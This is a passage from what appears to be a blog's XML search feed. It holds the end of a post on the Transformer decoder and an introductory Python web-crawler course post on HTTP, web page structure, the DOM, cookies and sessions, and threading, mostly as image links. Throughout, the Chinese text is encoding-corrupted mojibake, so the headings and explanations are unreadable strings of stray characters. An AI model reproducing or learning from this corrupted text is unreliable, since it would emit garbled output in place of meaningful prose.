src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/24.png"><br>FFæ˜¯ä¸¤å±‚å…¨è¿æ¥ã€‚ç„¶åå†åŠ ä¸Šæ®‹å·®å’Œæ„æˆå‰é¦ˆç¥ç»ç½‘ç»œ<br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/25.png"></p><h2 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h2><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/26.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/27.png"><br>å› ä¸ºåœ¨é¢„æµ‹çš„æ—¶å€™çœ‹ä¸åˆ°åé¢çš„å•è¯ï¼Œæ‰€ä»¥éœ€è¦maskæ‰</p><h3 id="å¤šå¤´æ³¨æ„åŠ›"><a href="#å¤šå¤´æ³¨æ„åŠ›" class="headerlink" title="å¤šå¤´æ³¨æ„åŠ›"></a>å¤šå¤´æ³¨æ„åŠ›</h3><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/28.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/29.png"><br>KVæ¥è‡ªENCODER<br>Qæ¥è‡ªDECODER<br>â€‹</p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonçˆ¬è™«å…¥é—¨</title>
      <link href="/2021/07/27/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/"/>
      <url>/2021/07/27/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¬¬01è®²-å¿…çŸ¥å¿…ä¼šï¼ŒæŒæ¡HTTPåŸºæœ¬åŸç†"><a href="#ç¬¬01è®²-å¿…çŸ¥å¿…ä¼šï¼ŒæŒæ¡HTTPåŸºæœ¬åŸç†" class="headerlink" title="ç¬¬01è®²:å¿…çŸ¥å¿…ä¼šï¼ŒæŒæ¡HTTPåŸºæœ¬åŸç†"></a>ç¬¬01è®²:å¿…çŸ¥å¿…ä¼šï¼ŒæŒæ¡HTTPåŸºæœ¬åŸç†</h2><h3 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h3><ul><li>URI(Uniform Resource ldentifier)å³ç»Ÿä¸€èµ„æºæ ‡å¿—ç¬¦</li><li>URL (Universal Resource Locator) å³ç»Ÿä¸€èµ„æºå®šä½ç¬¦</li></ul><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/0.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/1.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/2.png"><br>ä¸€èˆ¬éƒ½æ˜¯åªç”¨URIï¼ŒURL</p><h3 id="è¶…æ–‡æœ¬-Hypertext"><a href="#è¶…æ–‡æœ¬-Hypertext" class="headerlink" title="è¶…æ–‡æœ¬ (Hypertext)"></a>è¶…æ–‡æœ¬ (Hypertext)</h3><p>æµè§ˆå™¨é‡Œçœ‹åˆ°çš„ç½‘é¡µå°±æ˜¯è¶…æ–‡æœ¬è§£æè€Œæˆçš„ï¼Œå…¶ç½‘é¡µæºä»£ç æ˜¯ä¸€ç³»åˆ—HTMLä»£ç ï¼Œé‡Œé¢åŒ…å«äº†ä¸€ç³»åˆ—æ ‡ç­¾<br>æ¯”å¦‚:  </p><ul><li>imgæ˜¾ç¤ºå›¾ç‰‡</li><li>Ñ€æŒ‡å®šæ˜¾ç¤ºæ®µè½ç­‰ </li></ul><p>æµè§ˆå™¨è§£æè¿™äº›æ ‡ç­¾åï¼Œä¾¿å½¢æˆäº†æˆ‘ä»¬å¹³å¸¸çœ‹åˆ°çš„ç½‘é¡µï¼Œè€Œç½‘é¡µçš„æºä»£ç HTMLå°±å¯ä»¥ç§°ä½œè¶…æ–‡æœ¬</p><h3 id="åè®®ç±»å‹"><a href="#åè®®ç±»å‹" class="headerlink" title="åè®®ç±»å‹"></a>åè®®ç±»å‹</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/3.png"></p><h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/4.png"></p><h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/5.png"></p><h5 id="è¶Šæ¥è¶Šå¤šçš„ç½‘ç«™å’ŒAppéƒ½å·²ç»å‘HTTPS-æ–¹å‘å‘å±•"><a href="#è¶Šæ¥è¶Šå¤šçš„ç½‘ç«™å’ŒAppéƒ½å·²ç»å‘HTTPS-æ–¹å‘å‘å±•" class="headerlink" title="è¶Šæ¥è¶Šå¤šçš„ç½‘ç«™å’ŒAppéƒ½å·²ç»å‘HTTPS æ–¹å‘å‘å±•"></a>è¶Šæ¥è¶Šå¤šçš„ç½‘ç«™å’ŒAppéƒ½å·²ç»å‘HTTPS æ–¹å‘å‘å±•</h5><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/6.png"></p><h3 id="è¯·æ±‚"><a href="#è¯·æ±‚" class="headerlink" title="è¯·æ±‚"></a>è¯·æ±‚</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/7.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/8.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/9.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/10.png"></p><h4 id="GETå’ŒPOSTè¯·æ±‚æ–¹æ³•æœ‰å¦‚ä¸‹åŒºåˆ«"><a href="#GETå’ŒPOSTè¯·æ±‚æ–¹æ³•æœ‰å¦‚ä¸‹åŒºåˆ«" class="headerlink" title="GETå’ŒPOSTè¯·æ±‚æ–¹æ³•æœ‰å¦‚ä¸‹åŒºåˆ«"></a>GETå’ŒPOSTè¯·æ±‚æ–¹æ³•æœ‰å¦‚ä¸‹åŒºåˆ«</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/11.png"></p><h4 id="å…¶ä»–æ–¹æ³•"><a href="#å…¶ä»–æ–¹æ³•" class="headerlink" title="å…¶ä»–æ–¹æ³•"></a>å…¶ä»–æ–¹æ³•</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/12.png"></p><h4 id="è¯·æ±‚çš„ç½‘å€"><a href="#è¯·æ±‚çš„ç½‘å€" class="headerlink" title="è¯·æ±‚çš„ç½‘å€"></a>è¯·æ±‚çš„ç½‘å€</h4><p>å³ç»Ÿä¸€èµ„æºå®šä½ç¬¦URL, å¯ä»¥å”¯ä¸€ç¡®å®šæˆ‘ä»¬æƒ³è¯·æ±‚çš„èµ„æº</p><h4 id="è¯·æ±‚å¤´"><a href="#è¯·æ±‚å¤´" class="headerlink" title="è¯·æ±‚å¤´"></a>è¯·æ±‚å¤´</h4><p>ç”¨æ¥è¯´æ˜æœåŠ¡å™¨è¦ä½¿ç”¨çš„é™„åŠ ä¿¡æ¯ï¼Œæ¯”è¾ƒé‡è¦çš„ä¿¡æ¯æœ‰ Cookieã€ Refererã€ User-Agent</p><h5 id="å¸¸ç”¨çš„è¯·æ±‚å¤´ä¿¡æ¯"><a href="#å¸¸ç”¨çš„è¯·æ±‚å¤´ä¿¡æ¯" class="headerlink" title="å¸¸ç”¨çš„è¯·æ±‚å¤´ä¿¡æ¯"></a>å¸¸ç”¨çš„è¯·æ±‚å¤´ä¿¡æ¯</h5><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/13.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/14.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/15.png"></p><h4 id="è¯·æ±‚ä½“"><a href="#è¯·æ±‚ä½“" class="headerlink" title="è¯·æ±‚ä½“"></a>è¯·æ±‚ä½“</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/16.png"><br>åªæœ‰è®¾ç½®<img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/17.png">æ‰ä¼šä»¥è¡¨å•å½¢å¼æäº¤<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/18.png"></p><h3 id="å“åº”"><a href="#å“åº”" class="headerlink" title="å“åº”"></a>å“åº”</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/19.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/20.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/21.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/22.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/23.png"></p><h4 id="å“åº”å¤´"><a href="#å“åº”å¤´" class="headerlink" title="å“åº”å¤´"></a>å“åº”å¤´</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/24.png"></p><h4 id="å“åº”ä½“"><a href="#å“åº”ä½“" class="headerlink" title="å“åº”ä½“"></a>å“åº”ä½“</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/25.png"></p><h2 id="ç¬¬02è®²-å¤¯å®æ ¹åŸºï¼ŒWeb-ç½‘é¡µåŸºç¡€"><a href="#ç¬¬02è®²-å¤¯å®æ ¹åŸºï¼ŒWeb-ç½‘é¡µåŸºç¡€" class="headerlink" title="ç¬¬02è®²:å¤¯å®æ ¹åŸºï¼ŒWeb ç½‘é¡µåŸºç¡€"></a>ç¬¬02è®²:å¤¯å®æ ¹åŸºï¼ŒWeb ç½‘é¡µåŸºç¡€</h2><h3 id="ç½‘é¡µçš„ç»„æˆ"><a href="#ç½‘é¡µçš„ç»„æˆ" class="headerlink" title="ç½‘é¡µçš„ç»„æˆ"></a>ç½‘é¡µçš„ç»„æˆ</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/26.png"></p><h4 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h4><p>æ˜¯ç”¨æ¥æè¿°ç½‘é¡µçš„ä¸€ç§è¯­è¨€ å…¨ç§° Hyper Text Markup Language è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/27.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/28.png"></p><h4 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h4><p>CSS å…¨ç§°å«ä½œ Cascading Style Sheets, å³å±‚å æ ·å¼è¡¨<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/29.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/30.png"></p><h4 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/31.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/32.png"></p><h4 id="ç»¼ä¸Š"><a href="#ç»¼ä¸Š" class="headerlink" title="ç»¼ä¸Š"></a>ç»¼ä¸Š</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/33.png"></p><h3 id="ç½‘é¡µçš„ç»“æ„"><a href="#ç½‘é¡µçš„ç»“æ„" class="headerlink" title="ç½‘é¡µçš„ç»“æ„"></a>ç½‘é¡µçš„ç»“æ„</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/34.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/35.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/36.png"></p><h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/37.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/38.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/39.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/40.png"></p><h4 id="æ€æ ·å®šä½èŠ‚ç‚¹"><a href="#æ€æ ·å®šä½èŠ‚ç‚¹" class="headerlink" title="æ€æ ·å®šä½èŠ‚ç‚¹"></a>æ€æ ·å®šä½èŠ‚ç‚¹</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/41.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/42.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/43.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/44.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/45.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/46.png"></p><h2 id="ç¬¬03è®²-åŸç†æ¢ç©¶ï¼Œäº†è§£çˆ¬è™«çš„åŸºæœ¬åŸç†"><a href="#ç¬¬03è®²-åŸç†æ¢ç©¶ï¼Œäº†è§£çˆ¬è™«çš„åŸºæœ¬åŸç†" class="headerlink" title="ç¬¬03è®²:åŸç†æ¢ç©¶ï¼Œäº†è§£çˆ¬è™«çš„åŸºæœ¬åŸç†"></a>ç¬¬03è®²:åŸç†æ¢ç©¶ï¼Œäº†è§£çˆ¬è™«çš„åŸºæœ¬åŸç†</h2><h3 id="çˆ¬è™«å®šä¹‰"><a href="#çˆ¬è™«å®šä¹‰" class="headerlink" title="çˆ¬è™«å®šä¹‰"></a>çˆ¬è™«å®šä¹‰</h3><p>çˆ¬è™«å°±æ˜¯è·å–ç½‘é¡µå¹¶æå–å’Œä¿å­˜ä¿¡æ¯çš„è‡ªåŠ¨åŒ–ç¨‹åº</p><h3 id="çˆ¬è™«æ€ä¹ˆå·¥ä½œ"><a href="#çˆ¬è™«æ€ä¹ˆå·¥ä½œ" class="headerlink" title="çˆ¬è™«æ€ä¹ˆå·¥ä½œ"></a>çˆ¬è™«æ€ä¹ˆå·¥ä½œ</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/47.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/48.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/49.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/50.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/51.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/52.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/53.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/54.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/55.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/56.png"><br>å¯¹äºè¿™ç§æƒ…å†µ<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/57.png"></p><h2 id="ç¬¬04è®²-åŸºç¡€æ¢ç©¶ï¼Œ-Session-ä¸-Cookies"><a href="#ç¬¬04è®²-åŸºç¡€æ¢ç©¶ï¼Œ-Session-ä¸-Cookies" class="headerlink" title="ç¬¬04è®²:åŸºç¡€æ¢ç©¶ï¼Œ Session ä¸ Cookies"></a>ç¬¬04è®²:åŸºç¡€æ¢ç©¶ï¼Œ Session ä¸ Cookies</h2><h3 id="é™æ€ç½‘é¡µ"><a href="#é™æ€ç½‘é¡µ" class="headerlink" title="é™æ€ç½‘é¡µ"></a>é™æ€ç½‘é¡µ</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/58.png"><br>  ä½†å­˜åœ¨å¾ˆå¤§çš„ç¼ºé™·ï¼šå¦‚å¯ç»´æŠ¤æ€§å·®ï¼Œä¸èƒ½æ ¹æ®URLçµæ´»å¤šå˜åœ°æ˜¾ç¤ºå†…å®¹ç­‰ã€‚<br>  å› æ­¤ï¼ŒåŠ¨æ€ç½‘é¡µåº”è¿è€Œç”Ÿã€‚å®ƒå¯ä»¥åŠ¨æ€è§£æ URLä¸­å‚æ•°çš„å˜åŒ–ï¼Œå…³è”æ•°æ®åº“å¹¶åŠ¨æ€å‘ˆç°ä¸åŒçš„é¡µé¢å†…å®¹ï¼Œéå¸¸çµæ´»å¤šå˜ã€‚<br>ç°åœ¨é‡åˆ°çš„å¤§å¤šæ•°ç½‘ç«™éƒ½æ˜¯åŠ¨æ€ç½‘ç«™ï¼Œä¸å†æ˜¯ä¸€ä¸ªç®€å•çš„HTML å¯èƒ½ç”± JSPã€ PHPã€Pythonç­‰è¯­è¨€ç¼–å†™çš„ï¼Œå…¶åŠŸèƒ½æ¯”é™æ€ç½‘é¡µå¼ºå¤§å’Œä¸°å¯Œå¤ªå¤šã€‚åŠ¨æ€ç½‘ç«™è¿˜å¯ä»¥å®ç°ç”¨æˆ·ç™»å½•å’Œæ³¨å†Œçš„åŠŸèƒ½ã€‚</p><h3 id="æ— çŠ¶æ€"><a href="#æ— çŠ¶æ€" class="headerlink" title="æ— çŠ¶æ€"></a>æ— çŠ¶æ€</h3><p>  HTTP ç‰¹ç‚¹ä¹‹ä¸€ â€“æ— çŠ¶æ€ï¼šæ˜¯æŒ‡HTTPåè®®å¯¹äº‹åŠ¡å¤„ç†æ˜¯æ²¡æœ‰è®°å¿†èƒ½åŠ›çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æœåŠ¡å™¨ä¸çŸ¥é“å®¢æˆ·ç«¯æ˜¯ä»€ä¹ˆçŠ¶æ€ã€‚<br>  æ„å‘³ç€å¦‚æœåç»­éœ€è¦å¤„ç†å‰é¢çš„ä¿¡æ¯ï¼Œåˆ™å¿…é¡»é‡ä¼  è¿™ä¹Ÿå¯¼è‡´éœ€è¦é¢å¤–ä¼ é€’ä¸€äº›å‰é¢çš„é‡å¤è¯·æ±‚ï¼Œæ‰èƒ½è·å–åç»­å“åº”ã€‚</p><h3 id="Sessionå’ŒCookies"><a href="#Sessionå’ŒCookies" class="headerlink" title="Sessionå’ŒCookies"></a>Sessionå’ŒCookies</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/59.png"></p><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/60.png"></p><h3 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h3><p>æŒ‡æŸäº›ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½ã€è¿›è¡ŒSessionè·Ÿè¸ªè€Œå­˜å‚¨åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®</p><h3 id="Sessionå’ŒCookiesä½¿ç”¨æµç¨‹"><a href="#Sessionå’ŒCookiesä½¿ç”¨æµç¨‹" class="headerlink" title="Sessionå’ŒCookiesä½¿ç”¨æµç¨‹"></a>Sessionå’ŒCookiesä½¿ç”¨æµç¨‹</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/61.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/62.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/63.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/64.png"></p><h3 id="çœ‹çœ‹Cookies"><a href="#çœ‹çœ‹Cookies" class="headerlink" title="çœ‹çœ‹Cookies"></a>çœ‹çœ‹Cookies</h3><p>  æ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªcookieï¼Œä¸å¯æ”¹å<br>  valueï¼šå€¼ä¸ºunicodeå­—ç¬¦éœ€è¦ç”¨å­—ç¬¦ç¼–ç ï¼Œå¦‚æœæ˜¯äºŒè¿›åˆ¶æ•°æ®éœ€è¦ç”¨base64ç¼–ç <br>  Max-ageï¼šè¯¥Cookieå¤±æ•ˆçš„æ—¶é—´ï¼Œå•ä½ä¸ºç§’ï¼ŒMax-ageç§’ä¸ºæ­£æ•°ï¼Œåˆ™è¯¥Cookieåœ¨Max-ageç§’åå¤±æ•ˆï¼Œå¦‚æœä¸ºè´Ÿæ•°ï¼Œåˆ™å…³é—­æµè§ˆå™¨æ—¶å¤±æ•ˆ<br>  pathï¼šè‹¥è®¾ç½®pathï¼Œåˆ™åªæœ‰è·¯å¾„ä¸ºpathçš„ç½‘é¡µå¯ä»¥è®¿é—®è¯¥Cookie<br>  Domainï¼šå³å¯ä»¥è®¿é—®è¯¥Cookieçš„åŸŸå<br>  Sizeï¼šCookieçš„å¤§å°<br>  HTTPï¼šCookieçš„http-onlyå±æ€§ï¼Œè‹¥æ­¤å±æ€§ä¸ºtrueï¼Œåˆ™åªæœ‰åœ¨http-headersä¸­ä¼šå¸¦æœ‰æ­¤Cookieçš„ä¿¡æ¯ï¼Œè€Œä¸èƒ½é€šè¿‡document.cookieæ¥è®¿é—®æ­¤Cookie<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/65.png"></p><h3 id="ä¼šè¯Cookieå’ŒæŒä¹…Cookie"><a href="#ä¼šè¯Cookieå’ŒæŒä¹…Cookie" class="headerlink" title="ä¼šè¯Cookieå’ŒæŒä¹…Cookie"></a>ä¼šè¯Cookieå’ŒæŒä¹…Cookie</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/66.png"></p><h3 id="å¸¸è§è¯¯åŒº"><a href="#å¸¸è§è¯¯åŒº" class="headerlink" title="å¸¸è§è¯¯åŒº"></a>å¸¸è§è¯¯åŒº</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/67.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/68.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/69.png"></p><h2 id="ç¬¬05è®²-å¤šè·¯åŠ é€Ÿï¼Œäº†è§£å¤šçº¿ç¨‹åŸºæœ¬åŸç†"><a href="#ç¬¬05è®²-å¤šè·¯åŠ é€Ÿï¼Œäº†è§£å¤šçº¿ç¨‹åŸºæœ¬åŸç†" class="headerlink" title="ç¬¬05è®²:å¤šè·¯åŠ é€Ÿï¼Œäº†è§£å¤šçº¿ç¨‹åŸºæœ¬åŸç†"></a>ç¬¬05è®²:å¤šè·¯åŠ é€Ÿï¼Œäº†è§£å¤šçº¿ç¨‹åŸºæœ¬åŸç†</h2><h3 id="è¿›ç¨‹"><a href="#è¿›ç¨‹" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h3><p>è¿›ç¨‹å¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªå¯ä»¥ç‹¬ç«‹è¿è¡Œçš„ç¨‹åºå•ä½<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/70.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/71.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/72.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/73.png"></p><h3 id="å¹¶å‘å’Œå¹¶è¡Œ"><a href="#å¹¶å‘å’Œå¹¶è¡Œ" class="headerlink" title="å¹¶å‘å’Œå¹¶è¡Œ"></a>å¹¶å‘å’Œå¹¶è¡Œ</h3><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/74.png"><br>æ³¨æ„ï¼š</p><ul><li>åœ¨å•å¤„ç†å™¨å’Œå¤šå¤„ç†å™¨ç³»ç»Ÿä¸­éƒ½å¯ä»¥å­˜åœ¨ ä»…é ä¸€ä¸ªæ ¸ï¼Œå°±å¯ä»¥å®ç°å¹¶å‘ </li><li>åªèƒ½åœ¨å¤šå¤„ç†å™¨ç³»ç»Ÿä¸­å­˜åœ¨ å¦‚æœè®¡ç®—æœºå¤„ç†å™¨åªæœ‰ä¸€ä¸ªæ ¸ å°±ä¸å¯èƒ½å®ç°å¹¶è¡Œ</li></ul><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/75.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/76.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/77.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/78.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/79.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/80.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/81.png"><br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/82.png"></p><h4 id="ä»£ç æ¼”ç¤º"><a href="#ä»£ç æ¼”ç¤º" class="headerlink" title="ä»£ç æ¼”ç¤º"></a>ä»£ç æ¼”ç¤º</h4><p><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/83.png"><br>targetä¼ é€’æ–¹æ³•åç§°ï¼Œargsä¼ é€’æ–¹æ³•çš„å‚æ•°<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/84.png"><br>å¯ä»¥çœ‹åˆ°ä¸»çº¿ç¨‹æ²¡ç­‰å­çº¿ç¨‹å°±ç»“æŸäº†ï¼Œæ‰€ä»¥è¦è°ƒç”¨joinæ–¹æ³•<br><img src="https://snowgo.top/medias/medias/Python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8/85.png"><br>å°†t2è®¾ç½®ä¸ºå®ˆæŠ¤çº¿ç¨‹ï¼Œè‹¥ä¸»çº¿ç¨‹ç»“æŸï¼Œåˆ™å®ˆæŠ¤çº¿ç¨‹å°†è¢«å¼ºåˆ¶ç»“æŸï¼Œå½“ç„¶å¦‚æœè°ƒç”¨äº†joinæ–¹æ³•åˆ™ä¸ä¼šè¢«å¼ºåˆ¶é€€å‡º<br><img 